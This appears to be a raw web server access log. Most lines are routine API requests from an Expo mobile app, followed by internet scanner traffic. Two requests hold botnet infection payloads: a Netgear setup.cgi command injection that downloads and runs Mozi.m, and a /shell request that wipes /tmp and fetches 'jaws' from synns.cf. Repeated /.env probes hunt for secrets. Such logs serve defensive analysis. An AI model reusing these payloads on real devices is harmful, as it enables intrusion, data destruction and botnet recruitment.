::ffff:127.0.0.1 - - [29/Aug/2022:06:11:41 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:11:43 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:11:51 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:12:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:12:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:12:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:12:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:12:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:12:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:12:42 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:12:42 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:12:53 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:13:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:13:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:13:30 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:13:30 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:13:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:13:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:13:32 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:13:32 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:13:56 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:14:07 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:14:19 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:14:23 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:14:28 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:14:30 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:14:32 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:14:50 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:06 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:13 +0000] "GET /api/v1/users/62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:18 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:19 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:19 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:20 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:27 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:27 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:31 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:31 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:33 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:38 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:15:50 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::ffff:127.0.0.1 - - [29/Aug/2022:06:15:51 +0000] "GET /api/v1/templates?createUser=62fbbc03fd2881af5a4e559a HTTP/1.0" 304 - "-" "Expo/2.25.1.1015582 CFNetwork/1333.0.4 Darwin/21.5.0"
::1 - - [29/Aug/2022:06:25:48 +0000] "GET /echo.php HTTP/1.0" 404 147 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:06:34:46 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 148 "-" "-"
::1 - - [29/Aug/2022:06:44:32 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:06:44:32 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:06:55:04 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:127.0.0.1 - - [29/Aug/2022:07:12:22 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
::1 - - [29/Aug/2022:07:36:45 +0000] "GET /manager/text/list HTTP/1.0" 404 156 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [29/Aug/2022:07:43:36 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [29/Aug/2022:07:47:19 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Aug/2022:07:57:17 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:07:57:17 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:08:05:20 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:08:05:21 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:08:25:28 +0000] "GET / HTTP/1.0" 404 139 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::1 - - [29/Aug/2022:08:41:16 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:08:42:45 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:08:42:45 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:09:05:19 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [29/Aug/2022:09:08:11 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:09:13:20 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:09:42:23 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:09:42:24 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:09:46:48 +0000] "GET /hudson HTTP/1.0" 404 145 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [29/Aug/2022:10:02:54 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [29/Aug/2022:10:09:57 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Aug/2022:10:22:18 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [29/Aug/2022:10:33:13 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:10:33:13 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:10:39:16 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+synns.cf/jaws;sh+/tmp/jaws HTTP/1.0" - - "-" "Hello, world"
::ffff:127.0.0.1 - - [29/Aug/2022:11:05:11 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:11:05:12 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:11:16:24 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:11:16:24 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:11:27:17 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [29/Aug/2022:11:47:23 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Aug/2022:11:47:24 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::1 - - [29/Aug/2022:11:48:31 +0000] "GET /portal/redlion HTTP/1.0" 404 153 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:127.0.0.1 - - [29/Aug/2022:11:50:34 +0000] "GET /actuator/health HTTP/1.0" 404 154 "-" "Mozilla/5.0 zgrab/0.x"
::1 - - [29/Aug/2022:11:51:56 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Aug/2022:11:52:37 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::1 - - [29/Aug/2022:12:24:25 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [29/Aug/2022:12:52:57 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:12:52:58 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:12:53:36 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (compatible, MSIE 10.0, Windows NT, DigExt)"
::1 - - [29/Aug/2022:13:26:47 +0000] "GET / HTTP/1.0" 404 139 "-" "Hello World"
::1 - - [29/Aug/2022:13:42:50 +0000] "GET /hello_kitty.html HTTP/1.0" 404 155 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:13:45:05 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::1 - - [29/Aug/2022:14:04:39 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:14:04:39 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:14:07:31 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:14:07:32 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:14:29:23 +0000] "GET / HTTP/1.0" 404 139 "-" "Go-http-client/1.1"
::ffff:127.0.0.1 - - [29/Aug/2022:14:53:49 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:14:53:50 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:15:09:11 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::1 - - [29/Aug/2022:15:25:34 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:15:25:34 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:15:37:08 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
::1 - - [29/Aug/2022:16:13:28 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:17:03:03 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:17:03:04 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:17:05:05 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:17:05:05 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:17:35:07 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::1 - - [29/Aug/2022:17:56:55 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:17:57:19 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:17:57:19 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:18:23:27 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:18:36:08 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Android 8.0.0; Mobile; rv:63.0) Gecko/63.0 Firefox/63.0"
::1 - - [29/Aug/2022:18:49:22 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:127.0.0.1 - - [29/Aug/2022:19:07:46 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::1 - - [29/Aug/2022:19:18:50 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Edg/103.0.1264.71"
::ffff:127.0.0.1 - - [29/Aug/2022:19:24:07 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:19:24:07 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:19:46:54 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:20:05:08 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:20:05:09 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:20:11:31 +0000] "GET / HTTP/1.0" 404 139 "-" "Linux Gnu (cow)"
::ffff:127.0.0.1 - - [29/Aug/2022:20:18:12 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
::1 - - [29/Aug/2022:20:24:03 +0000] "GET /index.php HTTP/1.0" 404 148 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
::ffff:127.0.0.1 - - [29/Aug/2022:20:24:04 +0000] "GET /phpmyadmin/index.php HTTP/1.0" 404 159 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0"
::1 - - [29/Aug/2022:20:32:32 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [29/Aug/2022:20:32:33 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [29/Aug/2022:20:47:58 +0000] "GET / HTTP/1.0" 404 139 "-" "<title>(.*?)<\/title>"
::ffff:127.0.0.1 - - [29/Aug/2022:21:17:28 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
